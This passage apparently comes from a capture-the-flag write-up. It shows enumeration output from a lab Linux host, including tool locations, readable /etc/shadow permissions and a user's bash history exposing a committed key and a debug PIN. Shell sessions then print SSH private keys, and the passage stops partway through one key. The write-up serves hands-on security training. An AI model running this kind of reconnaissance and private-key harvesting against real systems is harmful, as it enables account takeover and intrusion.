-rw-r--r-- 1 root root  428 Oct 23  2015 dns-clean.service
-rw-r--r-- 1 root root  178 Oct  5  2015 usb_modeswitch@.service
-rw-r--r-- 1 root root  790 Jun  1  2015 friendly-recovery.service
-rw-r--r-- 1 root root  309 Apr 25  2015 saned@.service
-rw-r--r-- 1 root root  241 Mar  3  2015 ufw.service
-rw-r--r-- 1 root root  250 Feb 24  2015 ureadahead-stop.service
-rw-r--r-- 1 root root  242 Feb 24  2015 ureadahead-stop.timer
-rw-r--r-- 1 root root  401 Feb 24  2015 ureadahead.service
-rw-r--r-- 1 root root  283 Dec 28  2014 anacron-resume.service
-rw-r--r-- 1 root root  183 Dec 28  2014 anacron.service
-rw-r--r-- 1 root root  132 Dec 12  2014 saned.socket
-rw-r--r-- 1 root root  188 Feb 24  2014 rsync.service

/lib/systemd/system/system-update.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Feb 15  2018 fwupd-offline-update.service -> ../fwupd-offline-update.service

/lib/systemd/system/halt.target.wants:
total 0
lrwxrwxrwx 1 root root 24 Sep 13  2017 plymouth-halt.service -> ../plymouth-halt.service

/lib/systemd/system/initrd-switch-root.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Sep 13  2017 plymouth-start.service -> ../plymouth-start.service
lrwxrwxrwx 1 root root 31 Sep 13  2017 plymouth-switch-root.service -> ../plymouth-switch-root.service

/lib/systemd/system/kexec.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Sep 13  2017 plymouth-kexec.service -> ../plymouth-kexec.service

/lib/systemd/system/multi-user.target.wants:
total 0
lrwxrwxrwx 1 root root 15 Feb  1  2018 getty.target -> ../getty.target
lrwxrwxrwx 1 root root 33 Feb  1  2018 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
lrwxrwxrwx 1 root root 25 Feb  1  2018 systemd-logind.service -> ../systemd-logind.service
lrwxrwxrwx 1 root root 39 Feb  1  2018 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 32 Feb  1  2018 systemd-user-sessions.service -> ../systemd-user-sessions.service
lrwxrwxrwx 1 root root 24 Sep 13  2017 plymouth-quit.service -> ../plymouth-quit.service
lrwxrwxrwx 1 root root 29 Sep 13  2017 plymouth-quit-wait.service -> ../plymouth-quit-wait.service
lrwxrwxrwx 1 root root 15 Aug  4  2017 dbus.service -> ../dbus.service

/lib/systemd/system/poweroff.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Feb  1  2018 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 28 Sep 13  2017 plymouth-poweroff.service -> ../plymouth-poweroff.service

/lib/systemd/system/reboot.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Feb  1  2018 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 26 Sep 13  2017 plymouth-reboot.service -> ../plymouth-reboot.service

/lib/systemd/system/sysinit.target.wants:
total 0
lrwxrwxrwx 1 root root 30 Feb  1  2018 systemd-hwdb-update.service -> ../systemd-hwdb-update.service
lrwxrwxrwx 1 root root 24 Feb  1  2018 systemd-udevd.service -> ../systemd-udevd.service
lrwxrwxrwx 1 root root 31 Feb  1  2018 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
lrwxrwxrwx 1 root root 20 Feb  1  2018 cryptsetup.target -> ../cryptsetup.target
lrwxrwxrwx 1 root root 22 Feb  1  2018 dev-hugepages.mount -> ../dev-hugepages.mount
lrwxrwxrwx 1 root root 19 Feb  1  2018 dev-mqueue.mount -> ../dev-mqueue.mount
lrwxrwxrwx 1 root root 28 Feb  1  2018 kmod-static-nodes.service -> ../kmod-static-nodes.service
lrwxrwxrwx 1 root root 36 Feb  1  2018 proc-sys-fs-binfmt_misc.automount -> ../proc-sys-fs-binfmt_misc.automount
lrwxrwxrwx 1 root root 32 Feb  1  2018 sys-fs-fuse-connections.mount -> ../sys-fs-fuse-connections.mount
lrwxrwxrwx 1 root root 26 Feb  1  2018 sys-kernel-config.mount -> ../sys-kernel-config.mount
lrwxrwxrwx 1 root root 25 Feb  1  2018 sys-kernel-debug.mount -> ../sys-kernel-debug.mount
lrwxrwxrwx 1 root root 36 Feb  1  2018 systemd-ask-password-console.path -> ../systemd-ask-password-console.path
lrwxrwxrwx 1 root root 25 Feb  1  2018 systemd-binfmt.service -> ../systemd-binfmt.service
lrwxrwxrwx 1 root root 27 Feb  1  2018 systemd-journald.service -> ../systemd-journald.service
lrwxrwxrwx 1 root root 32 Feb  1  2018 systemd-journal-flush.service -> ../systemd-journal-flush.service
lrwxrwxrwx 1 root root 36 Feb  1  2018 systemd-machine-id-commit.service -> ../systemd-machine-id-commit.service
lrwxrwxrwx 1 root root 31 Feb  1  2018 systemd-modules-load.service -> ../systemd-modules-load.service
lrwxrwxrwx 1 root root 30 Feb  1  2018 systemd-random-seed.service -> ../systemd-random-seed.service
lrwxrwxrwx 1 root root 25 Feb  1  2018 systemd-sysctl.service -> ../systemd-sysctl.service
lrwxrwxrwx 1 root root 37 Feb  1  2018 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service
lrwxrwxrwx 1 root root 33 Feb  1  2018 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service
lrwxrwxrwx 1 root root 30 Feb  1  2018 systemd-update-utmp.service -> ../systemd-update-utmp.service
lrwxrwxrwx 1 root root 30 Sep 13  2017 plymouth-read-write.service -> ../plymouth-read-write.service
lrwxrwxrwx 1 root root 25 Sep 13  2017 plymouth-start.service -> ../plymouth-start.service
lrwxrwxrwx 1 root root 24 Aug  4  2017 console-setup.service -> ../console-setup.service
lrwxrwxrwx 1 root root 25 Aug  4  2017 keyboard-setup.service -> ../keyboard-setup.service
lrwxrwxrwx 1 root root 19 Aug  4  2017 setvtrgb.service -> ../setvtrgb.service

/lib/systemd/system/sockets.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Feb  1  2018 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
lrwxrwxrwx 1 root root 30 Feb  1  2018 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket
lrwxrwxrwx 1 root root 25 Feb  1  2018 systemd-initctl.socket -> ../systemd-initctl.socket
lrwxrwxrwx 1 root root 32 Feb  1  2018 systemd-journald-audit.socket -> ../systemd-journald-audit.socket
lrwxrwxrwx 1 root root 34 Feb  1  2018 systemd-journald-dev-log.socket -> ../systemd-journald-dev-log.socket
lrwxrwxrwx 1 root root 26 Feb  1  2018 systemd-journald.socket -> ../systemd-journald.socket
lrwxrwxrwx 1 root root 14 Aug  4  2017 dbus.socket -> ../dbus.socket

/lib/systemd/system/getty.target.wants:
total 0
lrwxrwxrwx 1 root root 23 Feb  1  2018 getty-static.service -> ../getty-static.service

/lib/systemd/system/graphical.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Feb  1  2018 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/local-fs.target.wants:
total 0
lrwxrwxrwx 1 root root 29 Feb  1  2018 systemd-remount-fs.service -> ../systemd-remount-fs.service

/lib/systemd/system/rescue.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Feb  1  2018 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/resolvconf.service.wants:
total 0
lrwxrwxrwx 1 root root 42 Feb  1  2018 systemd-networkd-resolvconf-update.path -> ../systemd-networkd-resolvconf-update.path

/lib/systemd/system/sigpwr.target.wants:
total 0
lrwxrwxrwx 1 root root 36 Feb  1  2018 sigpwr-container-shutdown.service -> ../sigpwr-container-shutdown.service

/lib/systemd/system/timers.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Feb  1  2018 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer

/lib/systemd/system/rc-local.service.d:
total 4.0K
-rw-r--r-- 1 root root 290 Oct 26  2017 debian.conf

/lib/systemd/system/systemd-timesyncd.service.d:
total 4.0K
-rw-r--r-- 1 root root 251 Oct 26  2017 disable-with-time-daemon.conf

/lib/systemd/system/systemd-resolved.service.d:
total 4.0K
-rw-r--r-- 1 root root 200 Oct 27  2017 resolvconf.conf

/lib/systemd/system/display-manager.service.d:
total 4.0K
-rw-r--r-- 1 root root 110 Aug 20  2016 xdiagnose.conf

/lib/systemd/system/basic.target.wants:
total 0
lrwxrwxrwx 1 root root 23 Aug  4  2017 alsa-restore.service -> ../alsa-restore.service
lrwxrwxrwx 1 root root 21 Aug  4  2017 alsa-state.service -> ../alsa-state.service

/lib/systemd/system/busnames.target.wants:
total 0

/lib/systemd/system/runlevel1.target.wants:
total 0

/lib/systemd/system/runlevel2.target.wants:
total 0

/lib/systemd/system/runlevel3.target.wants:
total 0

/lib/systemd/system/runlevel4.target.wants:
total 0

/lib/systemd/system/runlevel5.target.wants:
total 0

/lib/systemd/system-sleep:
total 8.0K
-rwxr-xr-x 1 root root  92 Mar 17  2016 hdparm
-rwxr-xr-x 1 root root 182 Oct 26  2015 wpasupplicant

/lib/systemd/network:
total 12K
-rw-r--r-- 1 root root 404 Feb  1  2018 80-container-host0.network
-rw-r--r-- 1 root root 482 Feb  1  2018 80-container-ve.network
-rw-r--r-- 1 root root  80 Feb  1  2018 99-default.link

/lib/systemd/system-generators:
total 656K
-rwxr-xr-x 1 root root  70K Feb  1  2018 systemd-cryptsetup-generator
-rwxr-xr-x 1 root root  58K Feb  1  2018 systemd-dbus1-generator
-rwxr-xr-x 1 root root  38K Feb  1  2018 systemd-debug-generator
-rwxr-xr-x 1 root root  78K Feb  1  2018 systemd-fstab-generator
-rwxr-xr-x 1 root root  38K Feb  1  2018 systemd-getty-generator
-rwxr-xr-x 1 root root 122K Feb  1  2018 systemd-gpt-auto-generator
-rwxr-xr-x 1 root root  34K Feb  1  2018 systemd-hibernate-resume-generator
-rwxr-xr-x 1 root root  38K Feb  1  2018 systemd-insserv-generator
-rwxr-xr-x 1 root root  30K Feb  1  2018 systemd-rc-local-generator
-rwxr-xr-x 1 root root  26K Feb  1  2018 systemd-system-update-generator
-rwxr-xr-x 1 root root 102K Feb  1  2018 systemd-sysv-generator

/lib/systemd/system-preset:
total 4.0K
-rw-r--r-- 1 root root 869 Feb  1  2018 90-systemd.preset

/lib/systemd/system-shutdown:
total 0


### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.8.16


### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/gcc


[-] Installed compilers:
ii  g++                                       4:5.3.1-1ubuntu1                             i386         GNU C++ compiler
ii  g++-5                                     5.4.0-6ubuntu1~16.04.9                       i386         GNU C++ compiler
ii  gcc                                       4:5.3.1-1ubuntu1                             i386         GNU C compiler
ii  gcc-5                                     5.4.0-6ubuntu1~16.04.9                       i386         GNU C compiler
ii  hardening-includes                        2.7ubuntu2                                   all          Makefile for enabling compiler flags for security hardening
ii  libllvm3.8:i386                           1:3.8-2ubuntu4                               i386         Modular compiler and toolchain technologies, runtime library
ii  libllvm4.0:i386                           1:4.0-1ubuntu1~16.04.2                       i386         Modular compiler and toolchain technologies, runtime library
ii  libxkbcommon0:i386                        0.5.0-1ubuntu2                               i386         library interface to the XKB compiler - shared library


[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 2439 Apr  3  2018 /etc/passwd
-rw-r--r-- 1 root root 1054 Apr  3  2018 /etc/group
-rw-r--r-- 1 root root 575 Oct 22  2015 /etc/profile
-rw-r----- 1 root shadow 1744 Apr  3  2018 /etc/shadow


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 624 Aug  8  2007 /etc/mtools.conf
-rw-r--r-- 1 root root 2084 Sep  6  2015 /etc/sysctl.conf
-rw-r--r-- 1 root root 1260 Mar 16  2016 /etc/ucf.conf
-rw-r--r-- 1 root root 529 Aug  1  2017 /etc/nsswitch.conf
-rw-r--r-- 1 root root 191 Jan 18  2016 /etc/libaudit.conf
-rw-r--r-- 1 root root 2584 Feb 18  2016 /etc/gai.conf
-rw-r--r-- 1 root root 4781 Mar 17  2016 /etc/hdparm.conf
-rw-r--r-- 1 root root 112 Jan 10  2014 /etc/apg.conf
-rw-r--r-- 1 root root 14867 Apr 12  2016 /etc/ltrace.conf
-rw-r--r-- 1 root root 27 Jan  7  2015 /etc/libao.conf
-rw-r--r-- 1 root root 3028 Aug  1  2017 /etc/adduser.conf
-rw-r--r-- 1 root root 1371 Jan 27  2016 /etc/rsyslog.conf
-rw-r--r-- 1 root root 110 Aug  4  2017 /etc/kernel-img.conf
-rw-r--r-- 1 root root 7649 Aug  1  2017 /etc/pnm2ppa.conf
-rw-r--r-- 1 root root 1018 Oct  5  2015 /etc/usb_modeswitch.conf
-rw-r--r-- 1 root root 552 Mar 16  2016 /etc/pam.conf
-rw-r--r-- 1 root root 703 May  6  2015 /etc/logrotate.conf
-rw-r--r-- 1 root root 34 Jan 27  2016 /etc/ld.so.conf
-rw-rw-r-- 1 root root 350 Aug  4  2017 /etc/popularity-contest.conf
-rw-r--r-- 1 root root 2969 Nov 10  2015 /etc/debconf.conf
-rw-r--r-- 1 root root 338 Nov 18  2014 /etc/updatedb.conf
-rw-r--r-- 1 root root 389 Apr 18  2016 /etc/appstream.conf
-rw-r--r-- 1 root root 1803 Nov  6  2015 /etc/signond.conf
-rw-r--r-- 1 root root 8464 Mar 19  2018 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 23444 Apr 28  2016 /etc/brltty.conf
-rw-r--r-- 1 root root 604 Jul  2  2015 /etc/deluser.conf
-rw-r--r-- 1 root root 10368 Oct  2  2015 /etc/sensors3.conf
-rw-r--r-- 1 root root 92 Oct 22  2015 /etc/host.conf
-rw-r--r-- 1 root root 967 Oct 30  2015 /etc/mke2fs.conf
-rw-r--r-- 1 root root 1308 Mar 10  2016 /etc/kerneloops.conf
-rw-r--r-- 1 root root 459 Jan 29  2018 /etc/fwupd.conf
-rw-r--r-- 1 root root 771 Mar  6  2015 /etc/insserv.conf
-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf


[-] Current user's history files:
-r-------- 1 roosa roosa 5704 Mar 21  2018 /home/roosa/.bash_history


[-] Location and contents (if accessible) of .bash_history file(s):
/home/git/.bash_history
/home/roosa/.bash_history
ssh-keygen --help
ssh-keygen
ls -altr .ssh/
cat .ssh/id_rsa.pub
nano /etc/host
nano /etc/hostname
sudo nano /etc/hostname
exit
nano .ssh/id_rsa.pub
exit
ssh git@localhost
exit
ssh git@localhost
clear
apt-get upgrade
exit
ls -altr
mkdir work
cd work
mkdir blogfeed
git init
git add .
git commit -m 'initial commit'
git config --global user.email "roosa@solita.fi"
git config --global user.name "Roosa Hakkerson"
git commit -m 'initial commit'
nano README-MD
nano README-md
nano README.md
git add README.md
git commit -m 'initial commit'
git remote add origin git@localhost:/srv/git/blogfeed.git
git push origin master
exit
ps -Af
kill 27499
exit
sudo su -
exit
groups
exit
git push origin master
cd work/blogfeed/
git push origin master
cd ..
cd blogfeed/
cd ..
git add README.md
git commit -m 'Initial commit'
git push
git log
ls
mkdir src
mkdir resources
cd resources
mkdir integration
mkdir integration/auth_credentials.key
nano integration/auth_credentials.key/
ls -altr
chmod go-rwx authcredentials.key
ls -atlr
cd ..
ls -altr
chmod -R o-rwx .
ls -altr
ls resources/
ls resources/integration/
ls -altr resources/
ls -altr resources/integration/
rm -Rf resources/integration/auth_credentials.key
mv resources/authcredentials.key resources/integration/
git add resources/integration/authcredentials.key
git commit -m 'add key for feed integration from tnerprise backend'
ls -altr resources/integration/
git push
ssh-keygen
ös -altr
ls .altr
ls -altr
cat kak
cp kak resources/integration/authcredentials.key
git add resources/integration/authcredentials.key
git commit -m 'reverted accidental commit with proper key'
git push
ls -altr
rm kak
rm kak.pub
git log
ls -altr
emacs src/feed.py
nano src/feed.py
nano src/feed.py
cd src/
ls -altr
nano index.html
nano upload.html
less feed.py
fg
fgg
nano feed.py
ls -altr
cd ..
ls -altr
git status
git add run-gunicorn.sh
nano run-gunicorn.sh
git add run-gunicorn.sh
git commit -m 'Gunicorn startup script'
git push
git add src/feed.py
git add src/upload.html
git add src/index.html
git commit -m 'Blogfeed app, initial version.'
git push
git log
nano src/feed.py
ifconfig
ls ..
ls -altr ~
cat ~/.wget-hsts
cat ~/.gitconfig
cat ~/examples.desktop
ls -altr ~
cat ~/.bash_history
cat run-gunicorn.sh
chmod u+x run-gunicorn.sh
./run-gunicorn.sh
ls -altr
cat feed.log
nano src/feed.py
cd src/
../run-gunicorn.sh
ls -altr
ifconfig
python -m SimpleHTTPServer
../run-gunicorn.sh
ls -altr
rm access.log
rm feed.log
ls -atlr
rm blagpost-xxe.xml
cd ..
ls -altr
rm access.log
rm feed.log
ls -altr
cd src
nano feed.py
../run-gunicorn.sh
ps -Af
ps
../run-gunicorn.sh
ls
cat feed.log
fg
nano feed.py
fg
nano feed.
nano feed.py
../run-gunicorn.sh
less feed.
less feed.log
../run-gunicorn.sh
export WERKZEUG_DEBUG_PIN=12345
../run-gunicorn.sh
nano config.py
nano feed.
nano feed.py
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
cccfg
fg
../run-gunicorn.sh
nano config.py
fg
nano feed.py
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
less config.py
nano config.py
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
less ../run-gunicorn.sh
cat ../run-gunicorn.sh
nano app.py
emacs app.py
xemacs app.py
emacs app.py
cat ../run-gunicorn.sh
emacs feed.py
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
ls -altr
git add feed.py
git status
git diff ../run-gunicorn.sh
ls -altr ..
git add ../run-gunicorn.sh
git commit -m 'Debug support added to make development more agile.'
git push
ls -altr
git log
ls -altr
ls -latr
cd ..
ls -altr
cd .git
ls -altr
cd ..
cd src
../run-gunicorn.sh
ls -altr
cd ..
cat run-gunicorn.sh
emacs run-gunicorn.sh
../run-gunicorn.sh
fg
emacs feed.py
../run-gunicorn.sh
git status
git add feed.py
cat ../run-gunicorn.sh
git add ../run-gunicorn.sh
git commit -m 'Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.'
git push
git log
cat ../run-gunicorn.sh
../run-gunicorn.sh
set | grep DEB
fg
cat ../run-gunicorn.sh
../run-gunicorn.sh
top
ls -altr
emacs index.html
../run-gunicorn.sh
fg
emacs index.html
../run-gunicorn.sh
fg
emacs feed.py
emacs index.html
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
emacs index.html
../run-gunicorn.sh
ps -Af
kill 26593
ps -Af
kill -9 26593
kill -9 26594
ls -altr
emas ../run-gunicorn.sh
emacs ../run-gunicorn.sh
emacs feed.
emacs feed.py
fg
emacs feed.py
python
cat save.p
fg
emacs feed.py
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
cat /etc/passwd
sudo su -
groups
sudo su -
exit
fg
exit
sudo su -
clear
ls -altr
exit
set|grep DEB
cd work/blogfeed/src/
cat ../run-gunicorn.sh
../run-gunicorn.sh
cat ../run-gunicorn.sh
export WERKZEUG_DEBUG_PIN=15123786
emacs ../run-gunicorn.sh
export WERKZEUG_DEBUG_PIN=151237
cat ../run-gunicorn.sh
../run-gunicorn.sh
emacs ../run-gunicorn.sh
export WERKZEUG_DEBUG_PIN=151237652
../run-gunicorn.sh
fg
emacs feed.py
cat ../run-gunicorn.sh
fg
cat ../run-gunicorn.sh
../run-gunicorn.sh
export FLASK_DEBUG=1
../run-gunicorn.sh
python feed.py
flask run
emacs feed.
fg
export FLASK_HOST=0.0.0.0
emacs feed.
flask run
flask --help
fg¨
emacs feed.py
emacs ../run-gunicorn.sh
emacs feed.py
../run-gunicorn.sh


[-] Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 root mail 4096 Aug  1  2017 .
drwxr-xr-x 14 root root 4096 Aug  1  2017 ..


### SCAN COMPLETE ####################################
roosa@gitter:/tmp$
```

```sh
[-] Location and contents (if accessible) of .bash_history file(s):
mkdir integration/auth_credentials.key
nano integration/auth_credentials.key/
```

```sh
roosa@gitter:~$ cd deploy/resources/integration/
roosa@gitter:~/deploy/resources/integration$ ls -l
total 4
-rw------- 1 roosa roosa 1679 Mar 26  2018 authcredentials.key
roosa@gitter:~/deploy/resources/integration$ cat authcredentials.key
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEApc7idlMQHM4QDf2d8MFjIW40UickQx/cvxPZX0XunSLD8veN
ouroJLw0Qtfh+dS6y+rbHnj4+HySF1HCAWs53MYS7m67bCZh9Bj21+E4fz/uwDSE
23g18kmkjmzWQ2AjDeC0EyWH3k4iRnABruBHs8+fssjW5sSxze74d7Ez3uOI9zPE
sQ26ynmLutnd/MpyxFjCigP02McCBrNLaclcbEgBgEn9v+KBtUkfgMgt5CNLfV8s
ukQs4gdHPeSj7kDpgHkRyCt+YAqvs3XkrgMDh3qI9tCPfs8jHUvuRHyGdMnqzI16
ZBlx4UG0bdxtoE8DLjfoJuWGfCF/dTAFLHK3mwIDAQABAoIBADelrnV9vRudwN+h
LZ++l7GBlge4YUAx8lkipUKHauTL5S2nDZ8O7ahejb+dSpcZYTPM94tLmGt1C2bO
JqlpPjstMu9YtIhAfYF522ZqjRaP82YIekpaFujg9FxkhKiKHFms/2KppubiHDi9
oKL7XLUpSnSrWQyMGQx/Vl59V2ZHNsBxptZ+qQYavc7bGP3h4HoRurrPiVlmPwXM
xL8NWx4knCZEC+YId8cAqyJ2EC4RoAr7tQ3xb46jC24Gc/YFkI9b7WCKpFgiszhw
vFvkYQDuIvzsIyunqe3YR0v8TKEfWKtm8T9iyb2yXTa+b/U3I9We1P+0nbfjYX8x
6umhQuECgYEA0fvp8m2KKJkkigDCsaCpP5dWPijukHV+CLBldcmrvUxRTIa8o4e+
OWOMW1JPEtDTj7kDpikekvHBPACBd5fYnqYnxPv+6pfyh3H5SuLhu9PPA36MjRyE
4+tDgPvXsfQqAKLF3crG9yKVUqw2G8FFo7dqLp3cDxCs5sk6Gq/lAesCgYEAyiS0
937GI+GDtBZ4bjylz4L5IHO55WI7CYPKrgUeKqi8ovKLDsBEboBbqRWcHr182E94
SQMoKu++K1nbly2YS+mv4bOanSFdc6bT/SAHKdImo8buqM0IhrYTNvArN/Puv4VT
Nszh8L9BDEc/DOQQQzsKiwIHab/rKJHZeA6cBRECgYEAgLg6CwAXBxgJjAc3Uge4
eGDe3y/cPfWoEs9/AptjiaD03UJi9KPLegaKDZkBG/mjFqFFmV/vfAhyecOdmaAd
i/Mywc/vzgLjCyBUvxEhazBF4FB8/CuVUtnvAWxgJpgT/1vIi1M4cFpkys8CRDVP
6TIQBw+BzEJemwKTebSFX40CgYEAtZt61iwYWV4fFCln8yobka5KoeQ2rCWvgqHb
8rH4Yz0LlJ2xXwRPtrMtJmCazWdSBYiIOZhTexe+03W8ejrla7Y8ZNsWWnsCWYgV
RoGCzgjW3Cc6fX8PXO+xnZbyTSejZH+kvkQd7Uv2ZdCQjcVL8wrVMwQUouZgoCdA
qML/WvECgYEAyNoevgP+tJqDtrxGmLK2hwuoY11ZIgxHUj9YkikwuZQOmFk3EffI
T3Sd/6nWVzi1FO16KjhRGrqwb6BCDxeyxG508hHzikoWyMN0AA2st8a8YS6jiOog
bU34EzQLp7oRU/TKO6Mx5ibQxkZPIHfgA1+Qsu27yIwlprQ64+oeEr0=
-----END RSA PRIVATE KEY-----
roosa@gitter:~/deploy/resources/integration$
```

```sh
roosa@gitter:~$ cd /home/
roosa@gitter:/home$ ls -l
total 32
drwxr-xr-x  2 blogfeed blogfeed  4096 Mar 19  2018 blogfeed
drwxr-xr-x  5 git      git       4096 Mar 19  2018 git
drwx------  2 root     root     16384 Aug  4  2017 lost+found
drwxr-xr-x 16 osboxes  osboxes   4096 Mar 26  2018 osboxes
drwxr-xr-x 22 roosa    roosa     4096 May 29 10:32 roosa
roosa@gitter:/home$ cd roosa/
roosa@gitter:~$ ls -lah
total 168K
drwxr-xr-x 22 roosa roosa 4.0K May 29 10:32 .
drwxr-xr-x  7 root  root  4.0K Mar 19  2018 ..
-r--------  1 roosa roosa 5.6K Mar 21  2018 .bash_history
-rw-r--r--  1 roosa roosa  220 Mar 19  2018 .bash_logout
-rw-r--r--  1 roosa roosa 3.7K Mar 19  2018 .bashrc
drwx------ 12 roosa roosa 4.0K Mar 21  2018 .cache
drwx------  3 roosa roosa 4.0K Mar 21  2018 .compiz
drwx------ 14 roosa roosa 4.0K Mar 21  2018 .config
drwx------  3 root  root  4.0K Mar 21  2018 .dbus
drwxrwxr-x  4 roosa roosa 4.0K Mar 26  2018 deploy
drwxr-xr-x  2 roosa roosa 4.0K May 29 10:44 Desktop
-rw-r--r--  1 roosa roosa   25 Mar 21  2018 .dmrc
drwxr-xr-x  2 roosa roosa 4.0K Mar 21  2018 Documents
drwxr-xr-x  2 roosa roosa 4.0K Mar 21  2018 Downloads
drwx------  3 roosa roosa 4.0K Mar 20  2018 .emacs.d
-rw-r--r--  1 roosa roosa 8.8K Mar 19  2018 examples.desktop
drwx------  2 roosa roosa 4.0K Mar 26  2018 .gconf
-rw-rw-r--  1 roosa roosa   56 Mar 19  2018 .gitconfig
drwx------  3 roosa roosa 4.0K May 31 04:49 .gnupg
-rw-------  1 roosa roosa 5.0K May 29 10:32 .ICEauthority
drwx------  3 roosa roosa 4.0K Mar 21  2018 .local
drwxr-xr-x  2 roosa roosa 4.0K Mar 21  2018 Music
drwxrwxr-x  2 roosa roosa 4.0K Mar 19  2018 .nano
drwxr-xr-x  2 roosa roosa 4.0K Mar 21  2018 Pictures
-rw-r--r--  1 roosa roosa  655 Mar 19  2018 .profile
drwxr-xr-x  2 roosa roosa 4.0K Mar 21  2018 Public
-rwxrw-r--  1 roosa roosa  147 Mar 26  2018 run-blogfeed.sh
-rw-rw-r--  1 roosa roosa 1.8K Mar 26  2018 service.sh
-rw-rw-r--  1 roosa roosa 2.2K Mar 26  2018 service.sh~
drwx------  2 roosa roosa 4.0K Mar 26  2018 .ssh
-rw-r--r--  1 roosa roosa    0 Mar 21  2018 .sudo_as_admin_successful
drwxr-xr-x  2 roosa roosa 4.0K Mar 21  2018 Templates
-r--------  1 roosa roosa   33 Mar 26  2018 user.txt
drwxr-xr-x  2 roosa roosa 4.0K Mar 21  2018 Videos
-rw-rw-r--  1 roosa roosa  182 Nov 13 18:43 .wget-hsts
drwxrwxr-x  3 roosa roosa 4.0K Mar 21  2018 work
-rw-------  1 roosa roosa  205 May 29 10:32 .Xauthority
-rw-------  1 roosa roosa 1.4K May 31 04:49 .xsession-errors
-rw-------  1 roosa roosa   82 May 24 15:51 .xsession-errors.old
roosa@gitter:~$ cd .ssh/
roosa@gitter:~/.ssh$ ls -lah
total 24K
drwx------  2 roosa roosa 4.0K Mar 26  2018 .
drwxr-xr-x 22 roosa roosa 4.0K May 29 10:32 ..
-rw-------  1 roosa roosa  394 Mar 26  2018 authorized_keys
-rw-------  1 roosa roosa 1.7K Mar 19  2018 id_rsa
-rw-r--r--  1 roosa roosa  394 Mar 19  2018 id_rsa.pub
-rw-r--r--  1 roosa roosa  222 Mar 19  2018 known_hosts
roosa@gitter:~/.ssh$
```

```sh
roosa@gitter:~/.ssh$ cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4wy3iqH+JvzrEkEubN4+Xr/llE0mRSP9e6/X53qdxxN99v/v2wheFraHhrh+nXwXneN3Hc+oQ7scBeWzMCUG8Z2DreL4vFaa7ynkGtOYQ+X5xDglH9H57E2CAe6qynyutwer3qVte05HLxI6WJSN+yk+xZ9jsluS0rJpArQm6dHbmNWS/liEZV7JpM2ZI09OWlkJUZUCnVGi1Z1z/R7HurOerjnAtva1kUYTTGZhN5eChpfj1AhBCeiLoM/f7sStBJ3pAZOrmYK+zOmdNSybAWPklF2GMazO3TMEaWWxWf3073Qqbek3xI3XJYJNqXoUtSK7FeD31hJXS0SXSt9JT roosa@gitter
roosa@gitter:~/.ssh$
```

```sh
roosa@gitter:~/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuMMt4qh/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7
9sIXha2h4a4fp18F53jdx3PqEO7HAXlszAlBvGdg63i+LxWmu8p5BrTmEPl+cQ4J
R/R+exNggHuqsp8rrcHq96lbXtORy8SOliUjfspPsWfY7JbktKyaQK0JunR25jVk
v5YhGVeyaTNmSNPTlpZCVGVAp1RotWdc/0ex7qznq45wLb2tZFGE0xmYTeXgoaX4
9QIQQnoi6DP3+7ErQSd6QGTq5mCvszpnTUsmwFj5JRdhjGszt0zBGllsVn99O90K
m3pN8SN1yWCTal6FLUiuxXg99YSV0tEl0rfSUwIDAQABAoIBAB6rj69jZyB3lQrS
